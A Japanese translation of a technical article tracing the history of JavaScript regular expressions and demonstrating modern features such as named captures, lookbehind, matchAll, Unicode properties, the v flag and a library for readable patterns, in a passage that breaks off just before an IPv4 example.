GMT</pubDate><content:encoded><![CDATA[<p><strong>クイックサマリー</strong>：以前は、JavaScriptの正規表現は他の言語の正規表現に比べてパフォーマンスが劣っていたものの、近年改良が重ねられ、他の言語に見劣りしなくなっています。この記事では、Steven Levithan氏がJavaScriptの正規表現の歴史と現状を評価し、より読みやすく、保守性とレジリエンスに優れた正規表現の書き方をアドバイスします。</p>
<hr>
<p>モダンJavaScriptの正規表現は、皆さんがよく知っている従来の正規表現と比べると随分進化しました。正規表現は<strong>テキストを検索して置き換えるツールとして非常に優れている</strong>一方で、書くのも理解するのも難しいという根強い評判があります（しかし今から説明するように、この認識は時代遅れかもしれません）。</p>
<p>正規表現に関するこの認識は、JavaScriptに特に当てはまります。PCREやPerl、.NET、Java、Ruby、C++、Pythonといったよりモダンな言語の正規表現に比べてパフォーマンスが劣るJavaScriptの正規表現は、長年人気が低迷していました。しかしそれはもはや過去の話です。</p>
<p>この記事では、JavaScriptの正規表現が経てきた改良の歴史を説明し（ネタバレ：ES2018とES2024が大きな転機となりました）、モダンな正規表現の機能を実例とともに紹介します。さらに、JavaScriptの正規表現を他のモダンな言語の正規表現に匹敵する、あるいは勝るものにした軽量な<a href="https://github.com/slevithan/regex">JavaScriptライブラリ</a>について紹介し、最後にJavaScriptの今後のバージョンで正規表現を改良し続けるために現在検討されている提案をいくつかお見せします（中には現在お使いのブラウザにすでに実装されているものもあります）。</p>
<h2>JavaScriptにおける正規表現の歴史 <a href="#JavaScriptにおける正規表現の歴史略の目的">#</a><a name="JavaScriptにおける正規表現の歴史"></a></h2>
<p>1999年に標準化されたECMAScript 3は、Perl由来の正規表現をJavaScriptに導入しました。大幅な改良が加わり、正規表現はかなり便利になりましたが（他のほとんどのPerl由来の正規表現とも互換性を得ました）、それでもいくつか大きな漏れがありました。JavaScriptの次に標準化されたバージョンであるES5が登場するまで10年かかりましたが、その間に他のプログラミング言語と正規表現の実装にいくつか便利な機能が新たに追加され、それらの正規表現はより強力で読みやすくなりました。</p>
<p>しかしそれは当時の話です。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>JavaScriptの新しいバージョンが出ると、ほぼ毎回正規表現に何らかの改良が行われていたことをご存知でしたか？</p></div></div>
<p>では実際に見てみましょう。</p>
<p>以下の機能の中には理解しにくいものもあるかもしれませんが、ご心配なく。主要な機能のいくつかは後で詳しく説明します。</p>
<ul>
<li>ES5（2009）では、正規表現のリテラル文字が評価されるたびに新しいオブジェクトが作成されるようにすることで、直感的でない振る舞いが修正され、正規表現のリテラル文字が文字クラス内でスラッシュをエスケープせずに使用できるようになりました（<code class="language-text">/[/]/</code>）。</li>
<li>ES6/ES2015では2つの正規表現フラグが新たに追加されました。パーサーで正規表現を使いやすくした<code class="language-text">y</code>（<code class="language-text">sticky</code>）と、厳格なエラーとともにUnicode関連のいくつかの重要な改良を追加した<code class="language-text">u</code>（<code class="language-text">unicode</code>）です。また、<code class="language-text">RegExp.prototype.flags</code>ゲッター、<code class="language-text">RegExp</code>のサブクラス化対応、フラグを変更しながら正規表現をコピーする機能も追加されました。</li>
<li>ES2018で、JavaScriptの正規表現はかなり改良されました。<code class="language-text">s</code>（<code class="language-text">dotAll</code>）フラグ、後読み、名前付きキャプチャ、Unicodeプロパティ（ES6の<code class="language-text">u</code>フラグを必要とする<code class="language-text">\p{...}</code>と<code class="language-text">\P{...}</code>により指定）が追加されました。後で説明するように、これらはすべて極めて便利な機能です。</li>
<li>ES2020では、文字列メソッドの<code class="language-text">matchAll</code>が追加されました。これについても後ほど説明します。</li>
<li>ES2022では、マッチしたサブ文字列が開始と終了のインデックスを取得できるようにする<code class="language-text">d</code>（<code class="language-text">hasIndices</code>）フラグが追加されました。</li>
<li>最後に、ES2024ではES6で実装された<code class="language-text">u</code>フラグのアップグレードとして<code class="language-text">v</code>（<code class="language-text">unicodeSets</code>）フラグが追加されました。<code class="language-text">v</code>フラグは、複数文字による一連の「文字列プロパティ」を<code class="language-text">\p{...}</code>に追加し、<code class="language-text">\p{...}</code>と<code class="language-text">\q{...}</code>を使用して文字クラス内に複数文字のエレメントを追加するほか、ネストした文字クラス、差集合<code class="language-text">[A--B]</code>、積集合<code class="language-text">[A&amp;&amp;B]</code>を追加し、文字クラス内に異なるエスケープ規則を追加します。また、否定集合<code class="language-text">[^...]</code>内におけるUnicodeプロパティの大文字と小文字を区別しないマッチングも修正されました。</li>
</ul>
<p>これらの機能は、現時点で安全にコードに組み込むことが可能です。これらの中で最新の機能である<code class="language-text">v</code>フラグは、Node.js 20および<a href="https://caniuse.com/mdn-javascript_builtins_regexp_unicodesets">2023年世代</a>のブラウザでサポートされています。その他の機能は2021年以前のブラウザでサポートされています。</p>
<p>ES2019からES2023までの各エディションでは、<code class="language-text">\p{...}</code>と<code class="language-text">\P{...}</code>により指定可能なUnicodeプロパティも新たに追加されています。さらに、ES2021では文字列メソッド<code class="language-text">replaceAll</code>も追加されました。ただし、正規表現を渡された際の挙動でES3の<code class="language-text">replace</code>と唯一異なる点は、<code class="language-text">g</code>フラグを使用していない場合に例外をスローすることです。</p>
<h2>余談：正規表現の良し悪しは何で決まる？ <a href="#余談：正規表現の良し悪しは何で決まる？">#</a><a name="余談：正規表現の良し悪しは何で決まる？"></a></h2>
<p>これらの変更が実装された今、JavaScriptの正規表現は他の正規表現と比べてどうなのでしょうか。考え方は色々ありますが、主な要素を以下に挙げます。</p>
<ul>
<li>
<p><strong>パフォーマンス</strong><br>
これは重要な要素ではありますが、成熟した正規表現の実装は概ねかなり速いので、最も重要ではないかもしれません。JavaScriptは正規表現のパフォーマンスは強力ですが（少なくとも、Node.js、Chromiumベースのブラウザ、<a href="https://hacks.mozilla.org/2020/06/a-new-regexp-engine-in-spidermonkey/">さらにはFirefox</a>で採用されているV8のIrregexpエンジンや、Safariで使われているJavaScriptCoreでは優れています）、バックトラッキングを制御する構文を一切持たないバックトラッキングエンジンを使用している点が大きな制約であり、ReDoSの脆弱性が広がる要因になっています。</p>
</li>
<li>
<p><strong>一般的または重要なユースケースを扱う先進機能への対応</strong><br>
JavaScriptはES2018とES2024で先進機能への対応が大きく進みました。後読み（無限の長さに対応）やUnicodeプロパティ（複数文字による「文字列プロパティ」、差集合、積集合、スクリプト拡張機能に対応）など一部の機能において、JavaScriptは今やクラス最高レベルです。これらの機能は、他の多くの正規表現でサポートされていないか、堅牢性が劣ります。</p>
</li>
<li>
<p><strong>読みやすく保守性に優れたパターンを書ける</strong><br>
ネイティブのJavaScriptは、この点で長年主要な言語の中で最低の評価を受けてきました。その理由は、ちょっとした空白やコメントを入力できるようにする<code class="language-text">x</code>（拡張）フラグが欠けているからです。正規表現のサブルーチンとサブルーチン定義グループ（PCREとPerlの機能）は、文法的に正しい正規表現を書き、合成により複雑なパターンを構築することを可能にする強力な機能ですが、これらもありません。</p>
</li>
</ul>
<p>つまり、良い面も悪い面もあるということです。</p>
<blockquote class=pull-quote><p><a class=pull-quote__link aria-label="Share on Twitter" href="https://twitter.com/share?text=%0aJavaScript%20regexes%20have%20become%20exceptionally%20powerful,%20but%20they%e2%80%99re%20still%20missing%20key%20features%20that%20could%20make%20regexes%20safer,%20more%20readable,%20and%20more%20maintainable%20%28all%20of%20which%20hold%20some%20people%20back%20from%20using%20this%20power%29.%0a&url=https://smashingmagazine.com%2f2024%2f08%2fhistory-future-regular-expressions-javascript%2f">JavaScriptの正規表現は極めて強力になりましたが、正規表現をより安全で、読みやすく、保守しやすくできる重要な機能がまだ欠けています（これは、その力を利用するのをためらう理由にもなっています）</a></p></blockquote>
<p>（訳注：原文同様 XへのPOSTリンクとなっています）</p>
<p>幸い、これらの穴はすべてJavaScriptライブラリによって埋めることができます。それについては後ほど説明します。</p>
<h2>JavaScriptのモダンな正規表現機能を使用する <a href="#JavaScriptのモダンな正規表現機能を使用する">#</a><a name="JavaScriptのモダンな正規表現機能を使用する"></a></h2>
<p>皆さんがあまり知らないかもしれない、もっと便利なモダン正規表現機能をいくつかご紹介します。先に言っておきますが、<strong>これはやや上級者向けのガイドです</strong>。正規表現を使い始めてまだ日が浅い方は、手始めに以下の素晴らしいチュートリアルをご覧いただくといいかもしれません。</p>
<ul>
<li><a href="https://regexlearn.com/">RegexLearn</a>と<a href="https://regexone.com/">RegexOne</a>はインタラクティブなチュートリアルで、練習問題もあります。</li>
<li>JavaScript.infoの<a href="https://javascript.info/regular-expressions">正規表現の章</a>は、JavaScriptに特化した詳細なガイドです。</li>
<li><a href="https://www.youtube.com/watch?v=M7vDtxaD7ZU">Demystifying Regular Expressions</a>（動画）は、Lea Verou氏がHolyJS 2017で行った、初心者向けの素晴らしい講演です。</li>
<li><a href="https://www.youtube.com/watch?v=rhzKDrUiJVk">Learn Regular Expressions In 20 Minutes</a>は、実際に正規表現テスターを動かしながら構文を説明する動画です。</li>
</ul>
<h2>名前付きキャプチャ <a href="#名前付きキャプチャ">#</a><a name="名前付きキャプチャ"></a></h2>
<p>正規表現が一致するかどうかを確認するだけでなく、一致する文字列からサブ文字列を抽出し、コード上で何らかの操作を行いたい場合も多いでしょう。名前付きキャプチャグループを使うことで、正規表現とコードが<strong>より読みやすく</strong>なり、<strong>自己文書化</strong>するような方法でそれを行うことができます。</p>
<p>以下の例では、2つの日付を持つレコードをマッチングさせ、値を取得します。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> record <span class="token operator">=</span> <span class="token string">'Admitted: 2024-01-01\nReleased: 2024-01-03'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^Admitted: (?&lt;admitted>\d{4}-\d{2}-\d{2})\nReleased: (?&lt;released>\d{4}-\d{2}-\d{2})$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>
<span class="token keyword">const</span> match <span class="token operator">=</span> record<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span>groups<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/* → {
  admitted: '2024-01-01',
  released: '2024-01-03'
} */</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>この正規表現を理解できなくても大丈夫です。これをもっと読みやすくする方法を後で説明します。ここで重要なのは、名前付きキャプチャグループが<code class="language-text">(?&lt;name>...)</code>構文を使用し、マッチした文字列の<code class="language-text">groups</code>オブジェクト上にその結果が格納されるということです。</p>
<p>また、名前付き後方参照を使用して、名前付きキャプチャグループが<code class="language-text">\k&lt;name></code>によりマッチングした文字列を再度マッチングすることもでき、検索や置換の中でそれらの値を以下のように使用することができます。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Change 'FirstName LastName' to 'LastName, FirstName'</span>
<span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'Shaquille Oatmeal'</span><span class="token punctuation">;</span>
name<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;first>\w+) (?&lt;last>\w+)</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">'$&lt;last>, $&lt;first>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → 'Oatmeal, Shaquille'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>置換コールバック関数内で名前付き後方参照を使用したい上級者は、最後の引数として<code class="language-text">groups</code>オブジェクトを指定します。以下に例を挙げます。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fahrenheitToCelsius</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;degrees>-?\d+(\.\d+)?)F\b</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> groups <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">at</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">round</span><span class="token punctuation">(</span><span class="token punctuation">(</span>groups<span class="token punctuation">.</span>degrees <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token operator">/</span><span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'C'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">fahrenheitToCelsius</span><span class="token punctuation">(</span><span class="token string">'98.6F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → '37C'</span>
<span class="token function">fahrenheitToCelsius</span><span class="token punctuation">(</span><span class="token string">'May 9 high is 40F and low is 21F'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → 'May 9 high is 4C and low is -6C'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>後読み <a href="#後読み">#</a><a name="後読み"></a></h2>
<p>後読み（ES2018で導入）は、JavaScriptの正規表現で以前からサポートされていた先読みを補完する機能です。先読みと後読みはアサーション（文字列の始まりを示す<code class="language-text">^</code>や、単語の境界を示す<code class="language-text">\b</code>と似ています）であり、マッチの過程で文字を一切消費しません。後読みは、サブパターンが現在のマッチ位置の直前に見つかるかどうかで成否が決まります。</p>
<p>例えば、以下の正規表現は後読み<code class="language-text">(?&lt;=...)</code>を使用して、「fat」の後に続く「cat」という単語（「cat」という単語のみ）をマッチングします。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;=fat )cat</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
<span class="token string">'cat, fat cat, brat cat'</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> <span class="token string">'pigeon'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → 'cat, fat pigeon, brat cat'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>また、否定後読み<code class="language-text">(?&lt;!...)</code>を使用してアサーションを反転させることもできます。そうすることで、正規表現は前に「fat」が付かないすべての「cat」をマッチングするようになります。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;!fat )cat</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
<span class="token string">'cat, fat cat, brat cat'</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span> <span class="token string">'pigeon'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// → 'pigeon, fat cat, brat pigeon'</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>後読みの実装はJavaScriptのものが最も優れています（匹敵するのは.NETだけです）。他の正規表現は後読みの中に可変長パターンを認めるかどうか、いつ認めるかについて一貫性のない複雑な規則を設けていますが、JavaScriptはあらゆるサブパターンについて後読みを認めています。</p>
<h2><code class="language-text">matchAll</code>メソッド <a href="#matchAllメソッド">#</a><a name="matchAllメソッド"></a></h2>
<p>ES2020ではJavaScriptの<code class="language-text">String.prototype.matchAll</code>が追加され、詳細なマッチ情報が必要な場合に正規表現マッチをループで実行しやすくなりました。以前は他の方法も利用できましたが、<code class="language-text">matchAll</code>の方が容易な場合が多く、長さゼロのマッチを返す可能性がある正規表現の結果に対してループ実行する際に無限ループに陥らないようにするなど、落とし穴も回避します。</p>
<p><code class="language-text">matchAll</code>はイテレータ（配列ではなく）を返すため、<code class="language-text">for...of</code>ループにおいて使いやすいという利点があります。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(?&lt;char1>\w)(?&lt;char2>\w)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> match <span class="token keyword">of</span> str<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span>re<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span>char1<span class="token punctuation">,</span> char2<span class="token punctuation">}</span> <span class="token operator">=</span> match<span class="token punctuation">.</span>groups<span class="token punctuation">;</span>
  <span class="token comment">// Print each complete match and matched subpatterns</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Matched "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" with "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>char1<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" and "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>char2<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><strong>注</strong>：正規表現で<code class="language-text">matchAll</code>を使用する場合、<code class="language-text">g</code>フラグ（<code class="language-text">global</code>）が必須となります。また、他のイテレータと同様に<code class="language-text">Array.from</code>または配列スプレッドを使用してすべての結果を配列として受け取ることも可能です。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">const</span> matches <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>str<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">.</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<h2>Unicodeプロパティ <a href="#Unicodeプロパティ">#</a><a name="Unicodeプロパティ"></a></h2>
<p>Unicodeプロパティ（ES2018で追加）は、<code class="language-text">\p{...}</code>構文とその否定形である`P{...}`を使用することで多言語テキストを強力に制御することを可能にします。マッチングできるプロパティは数百に及び、多岐にわたるUnicodeのカテゴリ、スクリプト、スクリプト拡張機能、バイナリプロパティを網羅します。</p>
<p>注：詳細については<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Unicode_character_class_escape">MDNのドキュメント</a>をご覧ください。</p>
<p>Unicodeプロパティでは<code class="language-text">u</code>（<code class="language-text">unicode</code>）または<code class="language-text">v</code>（<code class="language-text">unicodeSets</code>）フラグの使用が必須です。</p>
<h2><code class="language-text">v</code>フラグ <a href="#vフラグ">#</a><a name="vフラグ"></a></h2>
<p><code class="language-text">v</code>（<code class="language-text">unicodeSets</code>）フラグは、<code class="language-text">u</code>フラグのアップグレードとしてES2024で追加されました。これらのフラグを同時に使用することはできません。デフォルトのUnicode非対応モードでひそかにバグが紛れ込まないよう、ベストプラクティスとしていずれかのフラグを常に使用することが推奨されます。どちらを使用するかの判断は極めて単純です。<code class="language-text">v</code>フラグの環境（Node.js 20および2023年世代のブラウザ）のみのサポートで問題なければ<code class="language-text">v</code>フラグを使用し、それ以外の場合は<code class="language-text">u</code>フラグを使用します。</p>
<p><code class="language-text">v</code>フラグが実装されたことで、いくつかの新しい正規表現機能が追加されました。中でも特筆すべきなのが差集合と積集合です。これにより、<code class="language-text">A--B</code>（文字クラス内）を使用してAの文字列はマッチングし、Bの文字列はマッチングしないとか、<code class="language-text">A&amp;&amp;B</code>を使用してAとB両方の文字列をマッチングすることが可能になります。以下の例をご覧ください。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Matches all Greek symbols except the letter 'π'</span>
<span class="token operator">/</span><span class="token punctuation">[</span>\p<span class="token punctuation">{</span>Script_Extensions<span class="token operator">=</span>Greek<span class="token punctuation">}</span><span class="token operator">--</span>π<span class="token punctuation">]</span><span class="token operator">/</span>v

<span class="token comment">// Matches only Greek letters</span>
<span class="token operator">/</span><span class="token punctuation">[</span>\p<span class="token punctuation">{</span>Script_Extensions<span class="token operator">=</span>Greek<span class="token punctuation">}</span><span class="token operator">&amp;&amp;</span>\p<span class="token punctuation">{</span>Letter<span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token operator">/</span>v</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">v</code>フラグに関する詳細や、vフラグの他の新機能については、Google Chromeチームによるこちらの<a href="https://v8.dev/features/regexp-v-flag">説明</a>をご覧ください。</p>
<h2>絵文字のマッチングについて <a href="#絵文字のマッチングについて">#</a><a name="絵文字のマッチングについて"></a></h2>
<p>絵文字とは🤩🔥😎👌などのことですが、絵文字がテキスト上で符号化される方法は複雑です。正規表現で絵文字をマッチングしたい場合、<strong>1つの絵文字が1つのUnicodeコードポイントで構成されることもあれば、多くのUnicodeコードポイントで構成されることもある</strong>ことを認識しておくことが重要です。絵文字の正規表現を独自に展開する多くの人（ライブラリもです！）がこの点を見落とし（あるいは適切に実装しておらず）、バグを発生させてしまっています。</p>
<p>「👩🏻‍🏫」（女性教師：明るい肌の色）の絵文字に関する以下の詳細は、絵文字がいかに複雑になり得るかを示しています。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token comment">// Code unit length</span>
<span class="token string">'👩🏻‍🏫'</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token comment">// → 7</span>
<span class="token comment">// Each astral code point (above \uFFFF) is divided into high and low surrogates</span>

<span class="token comment">// Code point length</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token string">'👩🏻‍🏫'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token comment">// → 4</span>
<span class="token comment">// These four code points are: \u{1F469} \u{1F3FB} \u{200D} \u{1F3EB}</span>
<span class="token comment">// \u{1F469} combined with \u{1F3FB} is '👩🏻'</span>
<span class="token comment">// \u{200D} is a Zero-Width Joiner</span>
<span class="token comment">// \u{1F3EB} is '🏫'</span>

<span class="token comment">// Grapheme cluster length (user-perceived characters)</span>
<span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Intl<span class="token punctuation">.</span>Segmenter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">segment</span><span class="token punctuation">(</span><span class="token string">'👩🏻‍🏫'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>
<span class="token comment">// → 1</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>幸い、JavaScriptは<code class="language-text">\p{RGI_Emoji}</code>により任意の完全な絵文字を個別にマッチングできる簡単な方法を追加しました。これは一度に複数のコードポイントをマッチングできる高度な「文字列プロパティ」のため、ES2024の<code class="language-text">v</code>フラグが必要になります。</p>
<p><code class="language-text">v</code>フラグに対応していない環境で絵文字のマッチングを行いたい場合は、<a href="https://github.com/mathiasbynens/emoji-regex">emoji-regex</a>と<a href="https://github.com/slevithan/emoji-regex-xs">emoji-regex-xs</a>の2つの素晴らしいライブラリをチェックしてみてください。</p>
<h2>より読みやすく、保守性とレジリエンスに優れた正規表現を書く <a href="#より読みやすく、保守性とレジリエンスに優れた正規表現を書く">#</a><a name="より読みやすく、保守性とレジリエンスに優れた正規表現を書く"></a></h2>
<p>正規表現機能は長年にわたり改良を重ねてきましたが、ネイティブのJavaScriptの正規表現は、複雑なものになると読むにしろ保守するにしろ、まだ難しい場合があります。</p>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Regular Expressions are SO EASY!!!! <a href="https://t.co/q4GSpbJRbZ">pic.twitter.com/q4GSpbJRbZ</a></p>&mdash; Garabato Kid (@garabatokid) <a href="https://twitter.com/garabatokid/status/1147063121678389253?ref_src=twsrc%5Etfw">July 5, 2019</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<p>ES2018で追加された名前付きキャプチャは、正規表現の自己文書化を推し進めた素晴らしい機能であり、ES6の<code class="language-text">String.raw</code>タグにより、<code class="language-text">RegExp</code>コンストラクタを使用する際にバックスラッシュをすべてエスケープ処理する必要がなくなりました。可読性に関する主な改良はそれくらいです。</p>
<p>しかし、<code class="language-text">regex</code>という名前の軽量で高性能な<a href="https://github.com/slevithan/regex">JavaScriptライブラリ</a>（筆者作）があり、これを使用することで正規表現が劇的に読みやすくなります。このライブラリは、欠けている主な機能をPCRE（Perl-Compatible Regular Expressions）から追加し、ネイティブのJavaScriptの正規表現を出力することで可読性の向上を実現しています。Babelのプラグインとして使用することもできるため、ビルド時に<code class="language-text">regex</code>の呼び出しがトランスパイルされます。したがって、デベロッパーエクスペリエンスが改善され、ユーザーにランタイムコストがかかることもありません。</p>
<p><a href="https://github.com/PCRE2Project/pcre2">PCRE</a>は、PHPが正規表現のサポートに使用している人気のCライブラリで、他の無数のプログラミング言語やツールで使用されています。</p>
<p><code class="language-text">regex</code>という名前のタグ付きテンプレートリレラルを提供するregexライブラリが、どのようにしてわかりやすく保守しやすい複雑な正規表現を書く手助けをするのか、簡単に説明します。以下で説明する新しい構文は、すべてPCREで同様に機能します。</p>
<h2>ちょっとした空白とコメント <a href="#ちょっとした空白とコメント">#</a><a name="ちょっとした空白とコメント"></a></h2>
<p><code class="language-text">regex</code>は、デフォルトで空白や行コメント（<code class="language-text">#</code>で始まる）を自由に正規表現に追加できるようにすることで、可読性を改善しています。</p>
<div class="gatsby-highlight" data-language="javascript"><pre style="counter-reset: linenumber NaN" class="language-javascript line-numbers"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">{</span>regex<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'regex'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> date <span class="token operator">=</span> regex<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
  # Match a date in YYYY-MM-DD format
  (?&lt;year>  \d{4}) - # Year part
  (?&lt;month> \d{2}) - # Month part
  (?&lt;day>   \d{2})   # Day part
</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これは、PCREの<code class="language-text">xx</code>フラグを使用するのと同じです。</p>
<h2>サブルーチンとサブルーチン定義グループ <a href="#サブルーチンとサブルーチン定義グループ">#</a><a name="サブルーチンとサブルーチン定義グループ"></a></h2>
<p>サブルーチンは<code class="language-text">\g&lt;name></code>（nameは名前付きグループを指します）のように書き、参照されたグループを独立したサブパターンとして扱い、現在の位置でマッチしようとします。これにより、サブパターンの合成と再利用が可能になり、可読性と保守性が改善されます。</p>
<p>例えば、以下の正規表現は「192.168.12.123」のようなIPv4のアドレスとマッチします。</p>
